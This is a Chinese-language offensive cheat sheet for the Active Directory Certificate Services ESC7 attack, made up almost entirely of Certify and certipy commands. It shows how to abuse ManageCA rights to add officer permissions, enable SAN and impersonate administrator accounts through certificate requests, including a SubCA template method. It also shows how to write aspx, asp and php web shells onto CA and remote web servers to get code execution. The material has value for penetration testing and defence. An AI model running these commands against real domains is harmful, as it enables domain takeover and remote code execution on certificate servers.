# Active Directory - 证书 ESC7

## ESC7 - 证书颁发机构访问控制漏洞

**利用方法**

* 检测允许低权限用户拥有 `ManageCA` 或 `Manage Certificates` 权限的 CA

    ```ps1
    Certify.exe find /vulnerable
    # 或
    certipy find -enabled -u user@domain.local -p password -dc-ip 10.10.10.10

    # 添加"管理证书"权限
    certipy ca -ca 'DOMAIN-CA' -username user@domain.local -p GoldCrown -add-officer user -dc-ip 10.10.10.10 -target-ip 10.10.10.11
    ```

* 更改 CA 设置以启用易受攻击 CA 下所有模板的 SAN 扩展（ESC6）

    ```ps1
    Certify.exe setconfig /enablesan /restart
    ```

* 使用所需的 SAN 请求证书

    ```ps1
    Certify.exe request /template:User /altname:super.adm
    ```

* 如果需要则批准请求，或禁用审批要求

    ```ps1
    # 批准
    Certify.exe issue /id:[REQUEST ID]
    # 禁用
    Certify.exe setconfig /removeapproval /restart
    ```

**利用方法 2**：

从 **ManageCA** 到 ADCS 服务器 **RCE** 的替代利用方式：

```ps1
# 获取当前 CDP 列表。用于查找可写的远程共享：
Certify.exe writefile /ca:SERVER\ca-name /readonly

# 将 aspx shell 写入本地 Web 目录：
Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx

# 将默认 asp shell 写入本地 Web 目录：
Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp

# 将 php shell 写入远程 Web 目录：
Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php
```

**利用方法 3**：

```ps1
# 启用 SubCA 模板
certipy ca -ca 'DOMAIN-CA' -enable-template 'SubCA' -username user@domain.local -p password -dc-ip 10.10.10.10 -target-ip 10.10.10.11

# 基于 SubCA 模板请求证书
certipy req -ca 'DOMAIN-CA' -username user@domain.local -p password -dc-ip 10.10.10.10 -target-ip 10.10.10.11 -template SubCA -upn administrator@domain.local

# 颁发失败的证书请求
certipy ca -ca 'DOMAIN-CA' -issue-request 7 -username user@domain.local -p password -dc-ip 10.10.10.10 -target-ip 10.10.10.11

# 检索已颁发的证书
certipy req -ca 'DOMAIN-CA' -username user@domain.local -p password -dc-ip 10.10.10.10 -target-ip 10.10.10.11 -retrieve 7
```

## 参考资料

* [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
